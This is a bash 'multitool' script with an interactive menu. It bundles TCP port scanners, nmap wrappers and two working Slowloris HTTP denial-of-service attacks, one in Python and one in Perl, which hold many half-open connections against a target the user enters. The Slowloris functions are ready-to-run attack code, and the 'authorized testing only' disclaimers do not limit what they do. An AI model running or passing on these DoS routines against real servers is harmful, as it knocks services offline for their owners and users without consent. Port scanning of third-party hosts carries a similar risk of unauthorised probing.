#!/bin/bash
# ac's multittool 0.3.sh - Cross-Platform Edition
# Works on: Linux, macOS, Windows (Git Bash/WSL/Cygwin)
# Created for educational and authorized testing purposes only

# Cross-platform color support
if [ -t 1 ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    PURPLE='\033[0;35m'
    CYAN='\033[0;36m'
    NC='\033[0m'
else
    RED=''; GREEN=''; YELLOW=''; BLUE=''; PURPLE=''; CYAN=''; NC=''
fi

# OS Detection
detect_os() {
    case "$(uname -s)" in
        Linux*)     OS="Linux";;
        Darwin*)    OS="macOS";;
        CYGWIN*|MINGW*|MSYS*) OS="Windows";;
        *)          OS="Unknown";;
    esac
    echo -e "${CYAN}[*] Detected OS: $OS${NC}"
}

# Check dependencies cross-platform
check_deps() {
    local missing=()
    
    # Check for netcat (nc) - critical for port scanning
    if command -v nc &> /dev/null; then
        NC_CMD="nc"
    elif command -v ncat &> /dev/null; then
        NC_CMD="ncat"
    elif command -v netcat &> /dev/null; then
        NC_CMD="netcat"
    else
        missing+=("netcat/nc")
    fi
    
    # Check for nmap (optional but recommended)
    if ! command -v nmap &> /dev/null; then
        echo -e "${YELLOW}[!] Nmap not found - Nmap scanner will be disabled${NC}"
        NMAP_AVAILABLE=false
    else
        NMAP_AVAILABLE=true
    fi
    
    # Check for Python (for Slowloris)
    if command -v python3 &> /dev/null; then
        PYTHON_CMD="python3"
    elif command -v python &> /dev/null; then
        PYTHON_CMD="python"
    else
        missing+=("python")
    fi
    
    # Check for Perl (for alternative Slowloris)
    if ! command -v perl &> /dev/null; then
        echo -e "${YELLOW}[!] Perl not found - Perl Slowloris will be disabled${NC}"
        PERL_AVAILABLE=false
    else
        PERL_AVAILABLE=true
    fi
    
    # Check for timeout command (Linux) or gtimeout (macOS)
    if command -v timeout &> /dev/null; then
        TIMEOUT_CMD="timeout"
    elif command -v gtimeout &> /dev/null; then
        TIMEOUT_CMD="gtimeout"
    else
        TIMEOUT_CMD=""
        echo -e "${YELLOW}[!] timeout command not found - using perl for timeouts${NC}"
    fi
    
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}[!] Missing critical dependencies: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Installation instructions:${NC}"
        if [ "$OS" = "Linux" ]; then
            echo "  sudo apt-get install netcat-openbsd python3 nmap perl"
        elif [ "$OS" = "macOS" ]; then
            echo "  brew install netcat python3 nmap perl"
        elif [ "$OS" = "Windows" ]; then
            echo "  Install WSL or Cygwin with: netcat, python3, nmap, perl"
        fi
        exit 1
    fi
}

# Cross-platform TCP port scanner
port_scanner() {
    echo -e "${BLUE}[*] Starting Cross-Platform Port Scanner...${NC}"
    read -p "Target IP or hostname: " target
    read -p "Port range (e.g., 1-1000 or 22,80,443): " ports

    # Validate target
    if [ -z "$target" ]; then
        echo -e "${RED}[!] No target specified${NC}"
        return
    fi

    # Check if target is reachable
    if ! ping -c 1 -W 2 "$target" &> /dev/null; then
        echo -e "${YELLOW}[!] Warning: $target may not be reachable${NC}"
    fi

    if [[ "$ports" == *"-"* ]]; then
        IFS='-' read -ra range <<< "$ports"
        start=${range[0]}
        end=${range[1]}
        if [ -z "$start" ] || [ -z "$end" ]; then
            echo -e "${RED}[!] Invalid port range${NC}"
            return
        fi
        echo -e "${GREEN}[*] Scanning ports $start-$end on $target...${NC}"
        
        for ((port=start; port<=end; port++)); do
            if [ -n "$NC_CMD" ]; then
                # Use netcat with timeout
                if [ "$OS" = "Windows" ]; then
                    # Windows nc might not support timeout
                    $NC_CMD -zv -w 1 "$target" "$port" 2>&1 | grep -q "succeeded" && echo -e "${GREEN}[+] Port $port is OPEN${NC}"
                else
                    $NC_CMD -zv -w 1 "$target" "$port" 2>&1 | grep -q "succeeded\|open" && echo -e "${GREEN}[+] Port $port is OPEN${NC}"
                fi
            else
                # Fallback to Python TCP scanner
                $PYTHON_CMD -c "
import socket
import sys
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex(('$target', $port))
    if result == 0:
        print(f'[+] Port $port is OPEN')
    sock.close()
except:
    pass
"
            fi
        done
    else
        IFS=',' read -ra port_list <<< "$ports"
        for port in "${port_list[@]}"; do
            port=$(echo "$port" | xargs) # trim whitespace
            if [ -n "$NC_CMD" ]; then
                if [ "$OS" = "Windows" ]; then
                    $NC_CMD -zv -w 1 "$target" "$port" 2>&1 | grep -q "succeeded" && echo -e "${GREEN}[+] Port $port is OPEN${NC}" || echo -e "${RED}[-] Port $port is CLOSED${NC}"
                else
                    $NC_CMD -zv -w 1 "$target" "$port" 2>&1 | grep -q "succeeded\|open" && echo -e "${GREEN}[+] Port $port is OPEN${NC}" || echo -e "${RED}[-] Port $port is CLOSED${NC}"
                fi
            else
                $PYTHON_CMD -c "
import socket
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex(('$target', $port))
    if result == 0:
        print(f'[+] Port $port is OPEN')
    else:
        print(f'[-] Port $port is CLOSED')
    sock.close()
except:
    print(f'[-] Port $port is CLOSED')
"
            fi
        done
    fi
}

# Nmap scanner (cross-platform)
nmap_scanner() {
    if [ "$NMAP_AVAILABLE" = false ]; then
        echo -e "${RED}[!] Nmap not installed. Please install nmap for this feature.${NC}"
        return
    fi
    
    echo -e "${BLUE}[*] Starting Nmap Scanner...${NC}"
    read -p "Target IP or hostname: " target
    echo -e "${YELLOW}Scan types:${NC}"
    echo "  1. Quick scan (top 100 ports)"
    echo "  2. Standard scan (top 1000 ports)"
    echo "  3. Full TCP scan (all ports)"
    echo "  4. Service/Version detection"
    echo "  5. OS Detection"
    echo "  6. UDP scan (common ports)"
    read -p "Select scan type (1-6): " stype

    case $stype in
        1) nmap -T4 -F "$target" ;;
        2) nmap -T4 "$target" ;;
        3) 
            echo -e "${YELLOW}[!] Full scan may take a long time${NC}"
            nmap -T4 -p- -sS "$target"
            ;;
        4) nmap -T4 -A "$target" ;;
        5) 
            echo -e "${YELLOW}[!] OS detection requires root/admin privileges${NC}"
            if [ "$OS" = "Windows" ]; then
                nmap -O "$target"
            else
                sudo nmap -O "$target" 2>/dev/null || nmap -O "$target"
            fi
            ;;
        6) 
            echo -e "${YELLOW}[!] UDP scan may be slow and inaccurate${NC}"
            nmap -sU -T4 -F "$target"
            ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

# Slowloris - Python implementation (cross-platform)
slowloris_python() {
    echo -e "${RED}[!] SLOWLORIS ATTACK MODE - HTTP DoS${NC}"
    echo -e "${YELLOW}[*] WARNING: Use only on systems you own or have written permission to test!${NC}"
    read -p "Target IP/Hostname: " target
    read -p "Target Port (default 80): " port
    port=${port:-80}
    read -p "Number of connections (default 150): " connections
    connections=${connections:-150}
    read -p "Duration in seconds (default 60): " duration
    duration=${duration:-60}

    $PYTHON_CMD -c "
import socket
import random
import time
import sys

sockets = []
target = '$target'
port = $port
conn_count = $connections
duration = $duration

print(f'[+] Starting Slowloris on {target}:{port}')
print(f'[+] Opening {conn_count} connections...')

for i in range(conn_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f'GET /?{random.random()} HTTP/1.1\r\n'.encode())
        s.send(f'Host: {target}\r\n'.encode())
        s.send(f'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n'.encode())
        s.send(f'Accept: text/html,application/xhtml+xml\r\n'.encode())
        s.send(f'Accept-Language: en-US,en;q=0.9\r\n'.encode())
        # Keep socket alive with empty headers
        sockets.append(s)
        print(f'[+] Connection {i+1}/{conn_count} established')
        if (i+1) % 10 == 0:
            time.sleep(0.1)  # Rate limiting for reliability
    except Exception as e:
        print(f'[-] Failed connection {i+1}: {str(e)[:50]}')

print(f'[+] {len(sockets)} connections established, holding for {duration} seconds...')
print('[+] Sending keep-alive headers...')

for _ in range(duration // 10):
    for s in sockets[:]:
        try:
            s.send(f'X-Header: {random.random()}\r\n'.encode())
        except:
            sockets.remove(s)
    time.sleep(10)

print(f'[+] Closing {len(sockets)} connections...')
for s in sockets:
    try:
        s.close()
    except:
        pass
print('[+] Slowloris attack completed.')
"
}

# Slowloris - Perl implementation (cross-platform)
slowloris_perl() {
    if [ "$PERL_AVAILABLE" = false ]; then
        echo -e "${RED}[!] Perl not installed. Please install Perl for this feature.${NC}"
        return
    fi
    
    echo -e "${RED}[!] SLOWLORIS ATTACK MODE - Perl Implementation${NC}"
    echo -e "${YELLOW}[*] WARNING: Use only on systems you own or have written permission to test!${NC}"
    read -p "Target IP/Hostname: " target
    read -p "Target Port (default 80): " port
    port=${port:-80}
    read -p "Number of connections (default 150): " connections
    connections=${connections:-150}

    perl -e '
use IO::Socket;
use strict;
use warnings;

my $target = $ARGV[0] // die "Usage: slowloris.pl <target> <port> <connections>\n";
my $port = $ARGV[1] // 80;
my $connections = $ARGV[2] // 150;

print "Starting Slowloris on $target:$port\n";
my @sockets;
for (my $i=0; $i<$connections; $i++) {
    my $sock = IO::Socket::INET->new(
        PeerAddr => $target,
        PeerPort => $port,
        Proto => "tcp",
        Timeout => 2
    );
    if ($sock) {
        print $sock "GET / HTTP/1.1\r\n";
        print $sock "Host: $target\r\n";
        print $sock "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
        print $sock "Accept: */*\r\n";
        print $sock "Accept-Language: en-US,en;q=0.9\r\n";
        print $sock "Connection: keep-alive\r\n";
        print $sock "\r\n";
        push @sockets, $sock;
        print "Connection " . ($i+1) . " opened\n";
    }
}
print "Holding $connections connections... (Press Ctrl+C to stop)\n";
print "Sending keep-alive headers every 10 seconds...\n";
while (1) {
    sleep 10;
    for my $s (@sockets) {
        eval {
            print $s "X-Header: " . rand() . "\r\n";
            print $s "\r\n";
        };
    }
}
' "$target" "$port" "$connections"
}

# Advanced cross-platform port scanner (multi-threaded Python)
advanced_port_scanner() {
    echo -e "${BLUE}[*] Starting Advanced Multi-threaded Port Scanner...${NC}"
    read -p "Target IP or hostname: " target
    read -p "Start port: " start_port
    read -p "End port: " end_port
    read -p "Threads (default 50): " threads
    threads=${threads:-50}

    $PYTHON_CMD -c "
import socket
import threading
import queue
import sys
from datetime import datetime

target = '$target'
start_port = $start_port
end_port = $end_port
max_threads = $threads

print(f'[*] Scanning {target} ports {start_port}-{end_port}')
print(f'[*] Using {max_threads} threads')
print(f'[*] Started at {datetime.now().strftime("%H:%M:%S")}')

open_ports = []
q = queue.Queue()

def scan_port():
    while True:
        try:
            port = q.get_nowait()
        except queue.Empty:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
                sys.stdout.write(f'[+] Port {port} is OPEN\n')
                sys.stdout.flush()
            sock.close()
        except:
            pass
        q.task_done()

for port in range(start_port, end_port + 1):
    q.put(port)

threads = []
for _ in range(max_threads):
    t = threading.Thread(target=scan_port)
    t.daemon = True
    t.start()
    threads.append(t)

q.join()

for t in threads:
    t.join(timeout=0.1)

print(f'[*] Completed at {datetime.now().strftime("%H:%M:%S")}')
print(f'[*] Found {len(open_ports)} open ports')
if open_ports:
    print(f'[+] Open ports: {", ".join(map(str, sorted(open_ports)))}')
"
}

# Main menu
main_menu() {
    clear 2>/dev/null || cls 2>/dev/null || echo ""
    echo -e "${RED}"
    echo "  █████╗  ██████╗ ███████╗    ███╗   ███╗██╗   ██╗██╗  ████████╗████████╗██╗   ██╗██╗  ██╗"
    echo " ██╔══██╗██╔════╝ ██╔════╝    ████╗ ████║██║   ██║██║  ╚══██╔══╝╚══██╔══╝██║   ██║╚██╗██╔╝"
    echo " ███████║██║  ███╗█████╗      ██╔████╔██║██║   ██║██║     ██║      ██║   ██║   ██║ ╚███╔╝ "
    echo " ██╔══██║██║   ██║██╔══╝      ██║╚██╔╝██║██║   ██║██║     ██║      ██║   ██║   ██║ ██╔██╗ "
    echo " ██║  ██║╚██████╔╝███████╗    ██║ ╚═╝ ██║╚██████╔╝███████╗██║      ██║   ╚██████╔╝██╔╝ ██╗"
    echo " ╚═╝  ╚═╝ ╚═════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝      ╚═╝    ╚═════╝ ╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${GREEN}           ac's multittool 0.3 - Cross-Platform Edition${NC}"
    echo -e "${CYAN}           OS: $OS | Python: $PYTHON_CMD | Netcat: ${NC_CMD:-Not Found}${NC}"
    echo -e "${YELLOW}           Use responsibly and only on systems you own or have permission to test${NC}"
    echo ""
    echo -e "${PURPLE}╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║                    MAIN MENU                        ║${NC}"
    echo -e "${PURPLE}╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${PURPLE}║ 1. Port Scanner (Netcat/Python)                     ║${NC}"
    echo -e "${PURPLE}║ 2. Advanced Port Scanner (Python Multi-threaded)    ║${NC}"
    echo -e "${PURPLE}║ 3. Nmap Scanner (if installed)                      ║${NC}"
    echo -e "${PURPLE}║ 4. Slowloris DoS (Python)                          ║${NC}"
    echo -e "${PURPLE}║ 5. Slowloris DoS (Perl)                            ║${NC}"
    echo -e "${PURPLE}║ 6. Show System Info                                ║${NC}"
    echo -e "${PURPLE}║ 7. Exit                                            ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════════════════╝${NC}"
    read -p "Select an option: " choice

    case $choice in
        1) port_scanner ;;
        2) advanced_port_scanner ;;
        3) nmap_scanner ;;
        4) slowloris_python ;;
        5) slowloris_perl ;;
        6) 
            echo -e "${CYAN}[*] OS: $OS${NC}"
            echo -e "${CYAN}[*] Shell: $SHELL${NC}"
            echo -e "${CYAN}[*] Python: $($PYTHON_CMD --version 2>&1)${NC}"
            if [ -n "$NC_CMD" ]; then
                echo -e "${CYAN}[*] Netcat: $($NC_CMD -h 2>&1 | head -1)${NC}"
            fi
            if [ "$NMAP_AVAILABLE" = true ]; then
                echo -e "${CYAN}[*] Nmap: $(nmap --version 2>&1 | head -1)${NC}"
            fi
            ;;
        7) 
            echo -e "${GREEN}[*] Exiting...${NC}"
            exit 0 
            ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

# Main execution
detect_os
check_deps

while true; do
    main_menu
    echo ""
    read -p "Press Enter to continue..."
done